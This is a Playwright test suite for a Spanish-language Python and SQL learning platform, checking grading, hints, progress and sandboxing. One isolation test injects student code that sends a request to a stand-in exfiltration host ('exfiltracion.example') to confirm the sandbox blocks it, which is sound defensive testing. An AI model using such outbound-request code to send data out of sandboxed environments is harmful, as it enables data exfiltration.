import { expect, expectAccessible, openExercise, test, typeCode, waitForHydration } from './fixtures';

const PYTHON_LESSON = '/python/01-primeros-pasos/01-hola-python/';
const SQL_LESSON = '/sql/01-consultas-basicas/02-filtrar-con-where/';

test.describe('ejercicios de Python', () => {
  test('resolver un ejercicio lo marca como completado y persiste al recargar', async ({ page }) => {
    await page.goto(PYTHON_LESSON);
    const card = await openExercise(page, 'Tu primer saludo');

    await typeCode(page, 'Tu primer saludo', 'print("Hola mundo")');
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText(/Se esperaba 'Hola, mundo'/)).toBeVisible();
    await expect(card.getByText('En progreso').first()).toBeAttached();

    await typeCode(page, 'Tu primer saludo', 'print("Hola, mundo")');
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText('¡Todas las pruebas pasaron!')).toBeVisible();
    await expect(card.getByText('Completado').first()).toBeAttached();

    const progress = page.getByRole('progressbar', { name: 'Progreso de la lección' });
    await expect(progress).toHaveAttribute('value', '20'); // 1 de 5 actividades

    await page.reload();
    await expect(progress).toHaveAttribute('value', '20');
    // El borrador del código también se conserva.
    const reloaded = await openExercise(page, 'Tu primer saludo');
    await expect(reloaded.locator('.cm-content')).toContainText('print("Hola, mundo")');
  });

  test('un bucle infinito se detiene y el editor sigue funcionando', async ({ page }) => {
    await page.goto(PYTHON_LESSON);
    const card = await openExercise(page, 'Tu primer saludo');

    await typeCode(page, 'Tu primer saludo', 'while True:\n    pass');
    await card.getByRole('button', { name: 'Ejecutar' }).click();
    await expect(card.getByText(/tardó demasiado/)).toBeVisible({ timeout: 60_000 });

    await typeCode(page, 'Tu primer saludo', 'print("sigo vivo")');
    await card.getByRole('button', { name: 'Ejecutar' }).click();
    await expect(card.getByText('sigo vivo')).toBeVisible();
  });

  test('los errores muestran el tipo y la línea', async ({ page }) => {
    await page.goto(PYTHON_LESSON);
    const card = await openExercise(page, 'Tu primer saludo');
    await typeCode(page, 'Tu primer saludo', 'x = 1\nprint(y)');
    await card.getByRole('button', { name: 'Ejecutar' }).click();
    await expect(card.getByText(/NameError.*línea 2/)).toBeVisible();
  });

  test('las pistas se revelan una a una y la solución tras un intento', async ({ page }) => {
    await page.goto(PYTHON_LESSON);
    const card = await openExercise(page, 'Tu primer saludo');
    const solution = card.getByRole('button', { name: 'Ver solución' });

    await expect(solution).toBeDisabled();
    await card.getByRole('button', { name: 'Pista (0/3)' }).click();
    await expect(card.getByText('Usa la función')).toBeVisible();
    await expect(card.getByRole('button', { name: 'Pista (1/3)' })).toBeVisible();

    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(solution).toBeEnabled();
    await solution.click();
    await expect(card.getByText('Solución de referencia')).toBeVisible();
  });

  test('restablecer vuelve al código inicial y borra el borrador', async ({ page }) => {
    await page.goto('/python/01-primeros-pasos/02-variables-y-tipos/');
    const card = await openExercise(page, 'Actualiza un contador');
    const editor = card.locator('.cm-content');

    await typeCode(page, 'Actualiza un contador', 'visitas = 0');
    await card.getByRole('button', { name: 'Restablecer código' }).click();
    await expect(editor).toContainText('visitas = 100');
    await expect(editor).toContainText('# Actualiza visitas y muéstrala');

    await page.reload();
    await expect((await openExercise(page, 'Actualiza un contador')).locator('.cm-content')).toContainText(
      'visitas = 100',
    );
  });

  test('las entradas de input() se simulan', async ({ page }) => {
    await page.goto('/python/01-primeros-pasos/04-entrada-y-conversion/');
    const card = await openExercise(page, 'Suma de dos números');
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText(/Se esperaba 42 y se mostró '834'/)).toBeVisible();
  });
});

test.describe('aislamiento del código del estudiante', () => {
  // La CSP de la página no se aplica a los workers: la suya llega en la cabecera de su script.
  const EXTERNAL = 'https://exfiltracion.example/';

  test('el código Python no puede hacer peticiones a otros dominios', async ({ page }) => {
    const external: string[] = [];
    await page.route(`${EXTERNAL}**`, (route) => {
      external.push(route.request().url());
      return route.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, body: 'ok' });
    });

    await page.goto(PYTHON_LESSON);
    const card = await openExercise(page, 'Tu primer saludo');
    await typeCode(
      page,
      'Tu primer saludo',
      [
        'from js import XMLHttpRequest',
        'try:',
        '    peticion = XMLHttpRequest.new()',
        `    peticion.open("GET", "${EXTERNAL}datos", False)`,
        '    peticion.send()',
        '    print("respuesta", peticion.status)',
        'except Exception:',
        '    print("bloqueada")',
      ].join('\n'),
    );
    await card.getByRole('button', { name: 'Ejecutar' }).click();
    // Se mira la salida del programa, no el editor (que también contiene la palabra).
    const output = card.locator('pre').filter({ hasText: /^(bloqueada|respuesta)/ });
    await expect(output).toHaveText(/^bloqueada\s*$/);
    expect(external, 'El worker no debe llegar a enviar la petición').toEqual([]);
  });

  test('el código SQL y Python siguen funcionando con la CSP de los workers', async ({ page }) => {
    await page.goto(SQL_LESSON);
    const card = await openExercise(page, 'Clientes sin ciudad');
    await typeCode(page, 'Clientes sin ciudad', 'SELECT nombre FROM clientes WHERE ciudad IS NULL;');
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText('¡Correcto!')).toBeVisible();
  });
});

test.describe('ejercicios de SQL', () => {
  test('una consulta correcta se aprueba y muestra la tabla', async ({ page }) => {
    await page.goto(SQL_LESSON);
    const card = await openExercise(page, 'Clientes sin ciudad');

    await card.getByRole('button', { name: 'Ejecutar' }).click();
    await expect(card.getByText('La consulta no devolvió filas.')).toBeVisible();

    await typeCode(page, 'Clientes sin ciudad', 'SELECT nombre FROM clientes WHERE ciudad IS NULL;');
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText('¡Correcto!')).toBeVisible();
    await expect(card.getByRole('cell', { name: 'Sofía Díaz' })).toBeVisible();
    await expect(card.getByText('Completado').first()).toBeAttached();
    // El editor, el resultado y la tabla también deben ser accesibles.
    await expectAccessible(page);
  });

  test('explica por qué una consulta es incorrecta', async ({ page }) => {
    await page.goto(SQL_LESSON);
    const card = await openExercise(page, 'Productos económicos');
    await typeCode(page, 'Productos económicos', 'SELECT nombre, precio FROM productos WHERE precio <= 12;');
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText(/devuelve 2 fila\(s\) y se esperaban 5/)).toBeVisible();
  });

  test('una consulta que solo funciona con los datos visibles no se aprueba', async ({ page }) => {
    await page.goto(SQL_LESSON);
    const card = await openExercise(page, 'Electrónica disponible');
    // Olvida filtrar por `activo`: con los datos visibles el resultado coincide de casualidad.
    await typeCode(
      page,
      'Electrónica disponible',
      "SELECT nombre, stock FROM productos WHERE categoria = 'Electrónica' AND stock > 0;",
    );
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText(/funciona con estos datos, pero no con otros datos de prueba/)).toBeVisible();
    await expect(card.getByText('Completado')).toHaveCount(0);
  });

  test('los errores de SQL se muestran de forma legible', async ({ page }) => {
    await page.goto(SQL_LESSON);
    const card = await openExercise(page, 'Productos económicos');
    await typeCode(page, 'Productos económicos', 'SELECT nombre FROM producto;');
    await card.getByRole('button', { name: 'Ejecutar' }).click();
    await expect(card.getByText(/Error de SQL: .*producto/)).toBeVisible();
  });
});

test.describe('ejercicios de SQL que modifican la base de datos', () => {
  const LESSON = '/sql/04-modificar-datos/04-create-table/';

  test('crear una tabla muestra qué reglas cumple y se aprueba al cumplirlas todas', async ({ page }) => {
    await page.goto(LESSON);
    const card = await openExercise(page, 'Tu primera tabla');

    // El código inicial crea la tabla sin restricciones: se ejecuta, pero no cumple las reglas.
    await card.getByRole('button', { name: 'Ejecutar' }).click();
    await expect(card.getByRole('cell', { name: 'Rechaza un id repetido' })).toBeVisible();
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText(/El resultado todavía no es el esperado/)).toBeVisible();

    await typeCode(
      page,
      'Tu primera tabla',
      'CREATE TABLE categorias (id INTEGER PRIMARY KEY, nombre TEXT NOT NULL UNIQUE);',
    );
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText('¡Correcto!')).toBeVisible();
    await expect(card.getByText('Completado').first()).toBeAttached();
  });

  test('si falta la tabla pedida, se explica en lugar de fallar', async ({ page }) => {
    await page.goto(LESSON);
    const card = await openExercise(page, 'Identificadores automáticos');
    await typeCode(page, 'Identificadores automáticos', 'SELECT 1;');
    await card.getByRole('button', { name: 'Comprobar' }).click();
    await expect(card.getByText(/el resultado no se pudo revisar: .*proveedores/)).toBeVisible();
  });
});

test.describe('progreso', () => {
  test('marcar la lectura y responder un quiz se refleja en la sección', async ({ page }) => {
    await page.goto(PYTHON_LESSON);
    const markAsRead = page.getByRole('button', { name: 'Marcar lectura como completada' });
    await waitForHydration(page, markAsRead);
    await markAsRead.click();
    await expect(page.getByRole('button', { name: 'Lectura completada' })).toHaveAttribute('aria-pressed', 'true');

    const quiz = await openExercise(page, 'Comentarios');
    await quiz.getByRole('radio', { name: 'B', exact: true }).check();
    await quiz.getByRole('button', { name: 'Comprobar respuesta' }).click();
    await expect(quiz.getByText('No es correcto')).toBeVisible();
    await quiz.getByRole('radio', { name: 'A', exact: true }).check();
    await quiz.getByRole('button', { name: 'Comprobar respuesta' }).click();
    await expect(quiz.getByText('¡Correcto!')).toBeVisible();

    await page.goto('/python/');
    await expect(page.getByRole('heading', { name: /Tu progreso: \d+%/ })).not.toHaveText('Tu progreso: 0%');
    await expect(page.getByRole('link', { name: /Continuar: Hola, Python/ })).toBeVisible();
  });
});
